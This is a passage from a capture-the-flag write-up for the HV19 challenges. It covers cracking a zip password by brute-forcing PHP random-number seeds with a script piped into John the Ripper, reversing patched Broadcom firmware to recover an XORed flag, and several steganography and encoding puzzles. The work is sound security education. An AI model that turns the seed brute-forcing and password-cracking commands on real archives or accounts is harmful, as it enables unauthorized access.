+Yypyb5weMLZq
+DfbgWggFYA3R
+</code></pre>
+<p>Analysing this resulted in the following alphabet used for passwords: <code>23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz</code></p>
+<p>It's not super-obvious, but characters 0, 1, I, N, O, l (lowercase L), n, and o are missing.</p>
+<p>Fast-forwarding over multiple hours of confusion: There was a hint on Discord, that the title of the challenge had an important role here. So a DuckDuckGo (or was it the other one?) search for <code>IDA-PRO 23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz</code> led to <a href="https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/">https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/</a>. In that article, the same password format as in our challenge could be found. A strong indicator that we're on the right path. There, a team described how they broke IDA Pro's Pseudo Random Number Generator (PRNG) with brute force by trying out multiple programming languages and iterating over seeds.</p>
+<p>In contrast to that team, we already knew about the programming language used and, thanks to phpinfo, even what version of PHP is generating passwords (7.4.1) and the PRNG in use ("Mersenne Twister").</p>
+<p>Another thing to note is, that PHP's <code>srand(seed)</code> function casts down all seeds to a size 32 bit, so it's pointless to go beyond PHP's PHP_INT_MAX value.</p>
+<p>So all that remains to do, is to find the <a href="https://www.php.net/manual/en/function.srand.php">right seed</a> for the PRNG.</p>
+<p>To do so, I created a PHP script seeding the PRNG and generating one random number (with all 6 possible alphabets):</p>
+<div class="sourceCode" id="cb52"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb52-1"><a href="#cb52-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb52-2"><a href="#cb52-2"></a></span>
+<span id="cb52-3"><a href="#cb52-3"></a><span class="kw">$alphabets</span> = <span class="kw">array</span><span class="ot">(</span></span>
+<span id="cb52-4"><a href="#cb52-4"></a>    <span class="dv">0</span> =&gt; <span class="st">&quot;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&quot;</span><span class="ot">,</span></span>
+<span id="cb52-5"><a href="#cb52-5"></a>    <span class="dv">1</span> =&gt; <span class="st">&quot;abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ&quot;</span><span class="ot">,</span></span>
+<span id="cb52-6"><a href="#cb52-6"></a>    <span class="dv">2</span> =&gt; <span class="st">&quot;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&quot;</span><span class="ot">,</span></span>
+<span id="cb52-7"><a href="#cb52-7"></a>    <span class="dv">3</span> =&gt; <span class="st">&quot;23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ&quot;</span><span class="ot">,</span></span>
+<span id="cb52-8"><a href="#cb52-8"></a>    <span class="dv">4</span> =&gt; <span class="st">&quot;ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789&quot;</span><span class="ot">,</span></span>
+<span id="cb52-9"><a href="#cb52-9"></a>    <span class="dv">5</span> =&gt; <span class="st">&quot;ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz&quot;</span></span>
+<span id="cb52-10"><a href="#cb52-10"></a><span class="ot">);</span></span>
+<span id="cb52-11"><a href="#cb52-11"></a></span>
+<span id="cb52-12"><a href="#cb52-12"></a><span class="kw">function</span> generateString<span class="ot">(</span><span class="kw">$seed</span><span class="ot">,</span> <span class="kw">$alphabet</span><span class="ot">)</span></span>
+<span id="cb52-13"><a href="#cb52-13"></a>{</span>
+<span id="cb52-14"><a href="#cb52-14"></a>    <span class="fu">srand</span><span class="ot">(</span><span class="kw">$seed</span><span class="ot">);</span></span>
+<span id="cb52-15"><a href="#cb52-15"></a></span>
+<span id="cb52-16"><a href="#cb52-16"></a>    <span class="kw">$pwd</span> = <span class="st">&quot;&quot;</span><span class="ot">;</span></span>
+<span id="cb52-17"><a href="#cb52-17"></a>    <span class="kw">for</span> <span class="ot">(</span><span class="kw">$j</span>=<span class="dv">0</span><span class="ot">;</span> <span class="kw">$j</span> &lt; <span class="dv">12</span><span class="ot">;</span> <span class="kw">$j</span>++<span class="ot">)</span> { </span>
+<span id="cb52-18"><a href="#cb52-18"></a>        <span class="kw">$val</span> = <span class="fu">rand</span><span class="ot">(</span><span class="dv">0</span><span class="ot">,</span><span class="fu">strlen</span><span class="ot">(</span><span class="kw">$alphabet</span><span class="ot">)</span>-<span class="dv">1</span><span class="ot">);</span></span>
+<span id="cb52-19"><a href="#cb52-19"></a>        <span class="kw">$pwd</span> .= <span class="kw">$alphabet</span><span class="ot">[</span><span class="kw">$val</span><span class="ot">];</span></span>
+<span id="cb52-20"><a href="#cb52-20"></a>    }</span>
+<span id="cb52-21"><a href="#cb52-21"></a>    </span>
+<span id="cb52-22"><a href="#cb52-22"></a>    <span class="fu">fwrite</span><span class="ot">(</span><span class="kw">STDERR</span><span class="ot">,</span> <span class="st">&quot;&quot;</span> . <span class="kw">$seed</span> . <span class="st">&quot; &quot;</span> . <span class="kw">$alphabet</span> . <span class="st">&quot; &quot;</span> . <span class="kw">$pwd</span> . <span class="st">&quot;</span><span class="kw">\n</span><span class="st">&quot;</span><span class="ot">);</span></span>
+<span id="cb52-23"><a href="#cb52-23"></a>    <span class="kw">print</span><span class="ot">(</span><span class="kw">$pwd</span><span class="ot">);</span></span>
+<span id="cb52-24"><a href="#cb52-24"></a>    <span class="kw">print</span><span class="ot">(</span><span class="st">&quot;</span><span class="kw">\n</span><span class="st">&quot;</span><span class="ot">)</span></span>
+<span id="cb52-25"><a href="#cb52-25"></a>}</span>
+<span id="cb52-26"><a href="#cb52-26"></a></span>
+<span id="cb52-27"><a href="#cb52-27"></a><span class="kw">$start</span> = <span class="dv">0</span><span class="ot">;</span></span>
+<span id="cb52-28"><a href="#cb52-28"></a><span class="kw">for</span> <span class="ot">(</span><span class="kw">$i</span>=<span class="kw">$start</span><span class="ot">;</span> <span class="kw">$i</span> &lt; <span class="kw">PHP_INT_MAX</span><span class="ot">;</span> <span class="kw">$i</span>++<span class="ot">)</span> { </span>
+<span id="cb52-29"><a href="#cb52-29"></a></span>
+<span id="cb52-30"><a href="#cb52-30"></a>    <span class="fu">fwrite</span><span class="ot">(</span><span class="kw">STDERR</span><span class="ot">,</span> <span class="st">&quot;</span><span class="kw">$i\n</span><span class="st">&quot;</span><span class="ot">);</span></span>
+<span id="cb52-31"><a href="#cb52-31"></a>    <span class="kw">for</span> <span class="ot">(</span><span class="kw">$a</span>=<span class="dv">0</span><span class="ot">;</span> <span class="kw">$a</span> &lt; <span class="fu">sizeof</span><span class="ot">(</span><span class="kw">$alphabets</span><span class="ot">);</span> <span class="kw">$a</span>++<span class="ot">)</span> { </span>
+<span id="cb52-32"><a href="#cb52-32"></a></span>
+<span id="cb52-33"><a href="#cb52-33"></a>        generateString<span class="ot">(</span><span class="kw">$i</span><span class="ot">,</span> <span class="kw">$alphabets</span><span class="ot">[</span><span class="kw">$a</span><span class="ot">]);</span></span>
+<span id="cb52-34"><a href="#cb52-34"></a>    }</span>
+<span id="cb52-35"><a href="#cb52-35"></a>}</span>
+<span id="cb52-36"><a href="#cb52-36"></a></span>
+<span id="cb52-37"><a href="#cb52-37"></a><span class="kw">?&gt;</span></span></code></pre></div>
+<p>This script was then combined with John the Ripper, the zip password cracking tool:</p>
+<div class="sourceCode" id="cb53"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb53-1"><a href="#cb53-1"></a><span class="ex">zip2john</span> -o flag.txt Santa-data.zip <span class="op">&gt;</span> flag.txt.passwd.txt</span>
+<span id="cb53-2"><a href="#cb53-2"></a><span class="ex">php</span> solver.php <span class="op">2&gt;</span>seeds2 <span class="kw">|</span> <span class="ex">john</span> --stdin flag.txt.passwd.txt</span></code></pre></div>
+<p>With this, I was able to find that the used seed was <code>4333287</code>, the right alphabet was <code>abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789</code> and the encryption password was <code>Kwmq3Sqmc5sA</code>.</p>
+<p>With that, we could unzip the file and read the contents of <code>flag.txt</code>.</p>
+<h2 id="credits-3">Credits</h2>
+<p>Credits go once more to <em>mcia</em>. He cross-checked my script (after he found the flag, obviously) and sent me a link that allowed me to discover, that in PHP <code>rand() % 54</code> is not the same as <code>rand(0, 54)</code> *facepalm*.</p>
+<h2 id="flag-21">Flag</h2>
+<pre><code>HV19{Cr4ckin_Passw0rdz_like_IDA_Pr0}
+</code></pre>
+<h1 id="hv1924---ham-radio">HV19.24 - Ham Radio</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>DrSchottky</td>
+<td>leet</td>
+<td>fun; reverse engineering</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-23">Given</h2>
+<p>Elves built for santa a special radio to help him coordinating today's presents delivery.</p>
+<p>Resources: <a href="19bf7592-f3ee-474c-bf82-233f270bbf70.zip">HV19-ham radio.zip</a></p>
+<h2 id="approach-20">Approach</h2>
+<p>Disclaimer: Actions described hereafter happened, but not necessarily in this order. This is due to the author's lack of experience in reverse engineering and, hence, the educative approach taken.</p>
+<p>DuckDuckGo-ing for the binary's name resulted in many articles about a Broadcom wifi chip. Also, there were many references to Raspberry Pi Model 3. Turns out it's the RAM part of a wifi chip firmware used on some RPi models. Since all attempts to load the binary into a disassembler more or less failed (due to insufficient information on CPU architecture), I checked the architecture of my own RPi.</p>
+<pre><code>root@raspberrypi:/home/pi# lscpu 
+Architecture:        armv7l
+Byte Order:          Little Endian
+CPU(s):              4
+On-line CPU(s) list: 0-3
+Thread(s) per core:  1
+Core(s) per socket:  4
+Socket(s):           1
+Vendor ID:           ARM
+Model:               4
+Model name:          Cortex-A53
+Stepping:            r0p4
+CPU max MHz:         1200.0000
+CPU min MHz:         600.0000
+BogoMIPS:            38.40
+Flags:               half thumb fastmult vfp edsp neon vfpv3 tls vfpv4 idiva idivt vfpd32 lpae evtstrm crc32
+</code></pre>
+<p>Providing the Ghidra disassembler with this information resulted in meaningful assembly code. (Side note: Hopper seemed to produce only garbage in the beginning, but providing a base address and entry point of 0x0 combined with the above architecture information gave better results, equivalent to Ghidra).</p>
+<p><code>binwalk -Y</code> (which can be used to identify a binary's target architecture) was not helpful in this case:</p>
+<pre><code>$ binwalk -Y brcmfmac43430-sdio.bin 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+327           0x147           ARM executable code, 16-bit (Thumb), big endian, at least 555 valid instructions
+</code></pre>
+<p>Meanwhile, I checked the binary for cleartext strings, which is always a good thing. In the end of file, the following coud be found:</p>
+<pre><code>$ strings brcmfmac43430-sdio.bin | tail -n 20
+%7`%p
+8hyh
+8iyi
+AF3FHF
+2F(F
+Um9zZXMgYXJlIHJlZCwgVmlvbGV0cyBhcmUgYmx1ZSwgRHJTY2hvdHRreSBsb3ZlcyBob29raW5nIGlvY3Rscywgd2h5IHNob3VsZG4ndCB5b3U/
+pGnexmon_ver: 2.2.2-269-g4921d-dirty-16
+wl%d: Broadcom BCM%s 802.11 Wireless Controller %s
+DehW
+kDej
+DehKT
+kDehv
+kDeh
+kDehv
+-R#7
++./1y
+-).T
+[#EKIG(
+43430a1-roml/sdio-g-p2p-pool-pno-pktfilter-keepalive-aoe-mchan-tdls-proptxstatus-ampduhostreorder-lpc-sr-bcmcps Version: 7.45.41.46 (r666254 CY) CRC: 970a33e2 Date: Mon 2017-08-07 00:48:36 PDT Ucode Ver: 1043.206
+FWID 01-ef6eb4d3
+</code></pre>
+<p>The interesting parts are:</p>
+<ul>
+<li><code>Um9zZ...</code>: An unusually long cleartext string; turns out <strong>it's base64</strong> and encodes the following marvelous poem: "Roses are red, Violets are blue, DrSchottky loves hooking ioctls, why shouldn't you?"</li>
+<li><code>...nexmon_ver: 2.2.2...</code>: <a href="https://github.com/seemoo-lab/nexmon">Nexmon</a> is a <strong>firmware patching framework</strong> to which, oh surprise, the challenge author DrSchottky <a href="https://github.com/seemoo-lab/nexmon/graphs/contributors">contributes</a>. mcia confirmed, that this was most probably the right track.</li>
+</ul>
+<p>Another thing I did then was looking up the original firmware, as the one provided has obviously been patched. I found an original firmware at <a href="https://github.com/RPi-Distro/firmware-nonfree/tree/master/brcm">https://github.com/RPi-Distro/firmware-nonfree/tree/master/brcm</a>.</p>
+<p>Back to Ghidra.</p>
+<p>Loading in both firmwares and diffing them (which is something that comes with Ghidra) showed, that the base64 string <strong>was referenced</strong> by a function (<code>FUN_00058dd8</code>), that's been added by DrSchottky. The function looks as follows. Let's follow up on that.</p>
+<p><img src="HV19.24_reversing_brcm_firmware.png" alt="FUN_00058dd8" /></p>
+<p>Looking at the decompiled C representation of that function, its XOR operation is striking. It XORs some stack values (<code>SP+0x8</code>) with some data values (pointed to by <code>0x00058e88</code>, resulting in <code>0x00058eab</code>).</p>
+<p>At the indicated stack address we have the following values: <code>09 bc 31 3a 68 1a ab 72 47 86 7e e6 4a 1d 6f 04 2e 74 50 0d 78 06 3e 00</code></p>
+<p>The <em>initial</em> data values are (I removed the leading <code>00</code> as it's skipped right away): <code>29 6a 91 44 3b be 27 15 92 07 c9 f3 47 77 ed e5 26 10 76 74 80 57 1f 00</code></p>
+<p>XORing this results in some gibberish. Doh... However, that gibberish gets processed further by some function <code>func_0x00803cd4</code> which is not part of this binary. There's more! Somewhere...</p>
+<p>Reading up about how this firmware behaves and what else it could address, I stumbled over the following text, which suggests that the chip's ROM part starts at address 0x800000: <a href="https://github.com/seemoo-lab/nexmon/#dumping-the-rom-directly">https://github.com/seemoo-lab/nexmon/#dumping-the-rom-directly</a>.</p>
+<p>So, let's get that ROM, then. That's easier said than done. Hours later, and thanks to logical overflow and bread, I found it: <a href="https://github.com/seemoo-lab/bcm_misc/blob/master/bcm43430a1/rom.bin">https://github.com/seemoo-lab/bcm_misc/blob/master/bcm43430a1/rom.bin</a>. Close enough - let's see whether it makes sense. Loading into Ghidra at base address 0x800000 made it meaningful.</p>
+<p>It turns out, <code>func_0x00803cd4</code> is some sort of <em>strcpy</em> function, copying n bytes (<code>param_3</code>) from a memory location (<code>param_2</code>) to another (<code>param_1</code>). Not much new for our challenge, then.</p>
+<p>Ok, let's look at what happens if we proceed in a smarter way. Let's consider the branches which test for <code>0xcafe</code>, <code>0xd00d</code> and <code>0x1337</code> (which seem suspicious, given these oddly specific and CTF-like values).</p>
+<p>If <code>param_2</code> takes the value <code>0xcafe</code>, the base64 string is copied to the address indicated by <code>param_3</code> and returns. If it takes <code>0x1337</code>, we go down the XOR path. What if it takes <code>0xd00d</code>?</p>
+<p>If <code>param_2</code> takes <code>0xd00d</code>, <code>FUN_00002390</code> is called, which is in the initial (unpatched) binary. Some closer analysis indicated, that it is referenced quite often and it seems to be some sort of efficient <em>memcpy</em> copying n bytes (<code>param_3</code>) from one memory location (<code>param_2</code>) to another (<code>param_1</code>).</p>
+<p>Looking at the parameters given to <code>FUN_00002390</code>, it seems that we copy <code>0x17</code> bytes from <code>0x800000</code> to <code>0x00058eac</code> (which <code>0x00058e8c</code> points to).</p>
+<p>Let's digest this (it took me quite a while): The program copies bytes from the beginning of the ROM and places them to the location used for XORing. If that's not a milestone!?</p>
+<p>The first <code>0x17</code> bytes of the ROM are: <code>41 ea 00 03 13 43 9b 07 30 b5 10 d1 0c 68 03 68 63 40 13 60 4c 68 43</code></p>
+<p>XORed with the value on the stack, this gives: <code>48 56 31 39 7b 59 30 75 77 33 6e 37 46 75 6c 6c 4d 34 43 6d 34 6e 7d</code></p>
+<p>...which is our <strong>flag</strong>!</p>
+<p>So, to summarize, the analysed function has to be called twice. Once with a value of <code>0xd00d</code> to initialize data and a second time with a value of <code>0x1337</code> to do the XOR and get the flag.</p>
+<h3 id="distractors">Distractors</h3>
+<p>As described, I took the diff between the patched firmware and the original one. Turns out, this was more a disctractor than a help. With differing sections being highlighted, I decided to have a look at them at some point. That was the start of a veeery deep rabbit hole.</p>
+<p>0xcc managed to pull me out of that rabbit hole a couple of hours before the challenge's deadline for full points.</p>
+<p>In the process of solving this challenge, I also learned a lot about <a href="https://www.blackhat.com/presentations/bh-europe-04/bh-eu-04-dehaas/bh-eu-04-dehaas.pdf">ARM architectures</a> and binaries, which can be in ARM mode (32 bit), thumb mode (16 bit) etc. This link also made me discover <code>disarm</code>.</p>
+<p>I also discovered that there's much more about firmware reversing to be learned. Another link to keep is <a href="https://blog.quarkslab.com/reverse-engineering-broadcom-wireless-chipsets.html">https://blog.quarkslab.com/reverse-engineering-broadcom-wireless-chipsets.html</a>.</p>
+<p>In addition to what was needed for the flag, I reversed the remaining function call <code>FUN_00058d9c</code>, which seems to initialize a data stucture, but was not helpful beyond that.</p>
+<p>I also went into <code>FUN_000455f8</code>, <code>FUN_000567f0</code>, <code>FUN_00055f9c</code> (!!!) and <code>FUN_00055e54</code>, all of which was just wasted time (and excercise).</p>
+<h2 id="credits-4">Credits</h2>
+<ul>
+<li><em>mcia</em> for moral support (and bringing me back in front of the screen when I already gave up).</li>
+<li><em>0xcc</em> for bringing me back on the right path.</li>
+<li><em>logical overflow</em> and <em>bread</em> for giving me a pointer, when I already started extracting a ROM after multiple hours of unsuccessful googling.</li>
+</ul>
+<h2 id="flag-22">Flag</h2>
+<pre><code>HV19{Y0uw3n7FullM4Cm4n}
+</code></pre>
+<h1 id="hv19h01---hidden-one">HV19.H01 - Hidden One</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>hidden</td>
+<td>novice</td>
+<td>fun</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-24">Given</h2>
+<p>Day 06 &gt; the Copy&amp;Paste box contains whitespaces and tabs:</p>
+<pre><code>Born: January 22                                                  
+Died: April 9                                                 
+Mother: Lady Anne                                             
+Father: Sir Nicholas                                                          
+Secrets: unknown                                                  
+</code></pre>
+<h2 id="approach-21">Approach</h2>
+<p>It's not morse, it's not ASCII, it's not a whitespace program. It's simply whitespace stego.</p>
+<p>Credits to mcia for phrasing out what I observed, but wasn't able to type out myself - leading to the snow/stegsnow tool. <a href="http://manpages.ubuntu.com/manpages/bionic/man1/stegsnow.1.html">http://manpages.ubuntu.com/manpages/bionic/man1/stegsnow.1.html</a></p>
+<div class="sourceCode" id="cb60"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb60-1"><a href="#cb60-1"></a><span class="co"># The following command probably doesn&#39;t work in a shell, but you get the point... ;)</span></span>
+<span id="cb60-2"><a href="#cb60-2"></a><span class="fu">cat</span> <span class="op">&lt;&lt; EOF</span></span>
+<span id="cb60-3"><a href="#cb60-3"></a>                                                  </span>
+<span id="cb60-4"><a href="#cb60-4"></a>                                              </span>
+<span id="cb60-5"><a href="#cb60-5"></a>                                          </span>
+<span id="cb60-6"><a href="#cb60-6"></a>                                                          </span>
+<span id="cb60-7"><a href="#cb60-7"></a>                                                  </span>
+<span id="cb60-8"><a href="#cb60-8"></a><span class="op">EOF</span> <span class="op">&gt;</span> bla.txt</span>
+<span id="cb60-9"><a href="#cb60-9"></a><span class="ex">stegsnow</span> -C bla.txt</span></code></pre></div>
+<h2 id="flag-23">Flag</h2>
+<p><code>HV19{1stHiddenFound}</code></p>
+<h1 id="hv19h02---hidden-two">HV19.H02 - Hidden Two</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>inik</td>
+<td>novice</td>
+<td>fun</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-25">Given</h2>
+<p>The <a href="3dbe0c12-d794-4f79-ae67-09ac27bd099d.zip">zip file</a> from HV19.07.</p>
+<h2 id="approach-22">Approach</h2>
+<p>Unzipping the zip file from HV19.07 produces an mp4 file called <code>3DULK2N7DcpXFg8qGo9Z9qEQqvaEDpUCBB1v.mp4</code>.</p>
+<p>Decode this file's base name with Base58 and get the flag.</p>
+<h2 id="flag-24">Flag</h2>
+<p><code>HV19{Dont_confuse_0_and_O}</code></p>
+<h1 id="hv19h03---hidden-three">HV19.H03 - Hidden three</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>M./inik</td>
+<td>novice</td>
+<td>fun; penetration testing</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-26">Given</h2>
+<p>"Not each quote is compl"</p>
+<p>Hidden three appeared together with HV19.11.</p>
+<h2 id="approach-23">Approach</h2>
+<ul>
+<li>Scan whale.hacking-lab.com.</li>
+<li>Discover port 17, ("Quote of the day") is open.</li>
+<li>Netcat to the port, check what's returned.</li>
+<li>Be disappointed that there's only 1 character and not a flag.</li>
+<li>Be bored and check again later only to notice the character changed.</li>
+<li>Use an AWS EC2 instance to poll the port.</li>
+<li>See that there's a new character every hour (*sigh*).</li>
+<li>Record characters for 24h.</li>
+<li>Get the flag.</li>
+</ul>
+<p>In other news, the flag was commented as follows (as tweeted by <a href="https://twitter.com/Cac0nym">@Cac0nym</a>):</p>
+<p><img src="./ELiCu05WkAA_hb9.png" alt="Waitiiing..." /></p>
+<h2 id="flag-25">Flag</h2>
+<pre><code>HV19{an0ther_DAILY_fl4g}
+</code></pre>
+<h1 id="hv19h04---hidden-four">HV19.H04 - Hidden Four</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>M.</td>
+<td>novice</td>
+<td>fun; programming</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-27">Given</h2>
+<p>Not much;</p>
+<p>Hidden 04 appeared together with HV19.14.</p>
+<h2 id="approach-24">Approach</h2>
+<p>Take the flag from HV19.14 and "run" it:</p>
+<pre><code>HV19{s@@jSfx4gPcvtiwxPCagrtQ@,y^p-za-oPQ^a-z\x20\n^&amp;&amp;s[(.)(..)][\2\1]g;s%4(...)%&quot;p$1t&quot;%ee}
+</code></pre>
+<h3 id="how-ive-done-it">How I've done it</h3>
+<p>And split it up into multiple regexes.</p>
+<div class="sourceCode" id="cb63"><pre class="sourceCode perl"><code class="sourceCode perl"><span id="cb63-1"><a href="#cb63-1"></a><span class="dt">$a</span>=<span class="kw">&quot;&quot;</span>;</span>
+<span id="cb63-2"><a href="#cb63-2"></a><span class="dt">$a</span>=~<span class="kw">s@@</span><span class="st">jSfx4gPcvtiwxPCagrtQ</span><span class="kw">@</span>; <span class="co"># s-function: substitute</span></span>
+<span id="cb63-3"><a href="#cb63-3"></a><span class="fu">print</span> <span class="kw">&quot;</span><span class="dt">${a}</span><span class="ch">\n</span><span class="kw">&quot;</span>;</span>
+<span id="cb63-4"><a href="#cb63-4"></a><span class="dt">$a</span>=~<span class="kw">y</span><span class="ot">^p-za-oPQ^a-z\x20\n^</span>;  <span class="co"># y-function: transliterate</span></span>
+<span id="cb63-5"><a href="#cb63-5"></a><span class="fu">print</span> <span class="kw">&quot;</span><span class="dt">${a}</span><span class="ch">\n</span><span class="kw">&quot;</span>;</span>
+<span id="cb63-6"><a href="#cb63-6"></a><span class="dt">$a</span>=~ <span class="kw">s[</span><span class="ch">(</span><span class="ot">.</span><span class="ch">)(</span><span class="ot">..</span><span class="ch">)</span><span class="kw">][</span><span class="st">\2</span><span class="ch">\1</span><span class="kw">]g</span>; <span class="co"># substitute globally (modifier: g)</span></span>
+<span id="cb63-7"><a href="#cb63-7"></a><span class="fu">print</span> <span class="kw">&quot;</span><span class="dt">${a}</span><span class="ch">\n</span><span class="kw">&quot;</span>;</span>
+<span id="cb63-8"><a href="#cb63-8"></a><span class="co"># Prints &quot;Squ4ring the Circle&quot;</span></span>
+<span id="cb63-9"><a href="#cb63-9"></a><span class="dt">$a</span>=~<span class="kw">s%</span><span class="ot">4</span><span class="ch">(</span><span class="ot">...</span><span class="ch">)</span><span class="kw">%</span><span class="st">&quot;p</span><span class="dt">$1t</span><span class="st">&quot;</span><span class="dt">%ee</span><span class="st">; # modifier: </span><span class="kw">ee</span> - evaluate the right side as a string then <span class="fu">eval</span> the result</span>
+<span id="cb63-10"><a href="#cb63-10"></a><span class="fu">print</span> <span class="kw">&quot;</span><span class="dt">${a}</span><span class="ch">\n</span><span class="kw">&quot;</span>;</span>
+<span id="cb63-11"><a href="#cb63-11"></a><span class="co"># Prints &quot;Squ1g the Circle&quot;</span></span></code></pre></div>
+<p>Investigating on modifers, the last expression obviously was meant to print out the flag.</p>
+<p>When run as a script, however, this does not work. So, I've taken the intermediary string to submit as a flag.</p>
+<h3 id="how-it-couldve-been-done">How it could've been done</h3>
+<p>After a quick chat with M. (the author of the challenge), I learned that this kind of things can be run directly inline:</p>
+<div class="sourceCode" id="cb64"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb64-1"><a href="#cb64-1"></a><span class="fu">perl</span> -e <span class="st">&#39;s@@jSfx4gPcvtiwxPCagrtQ@,y^p-za-oPQ^a-z\x20\n^&amp;&amp;s[(.)(..)][\2\1]g;s%4(...)%&quot;p$1t&quot;%ee&#39;</span></span></code></pre></div>
+<h2 id="credits-5">Credits</h2>
+<p>Thanks <em>M.</em> for being patient with me.</p>
+<h2 id="flag-26">Flag</h2>
+<pre><code>HV19{Squ4ring the Circle}
+</code></pre>
+</body>
+</html>
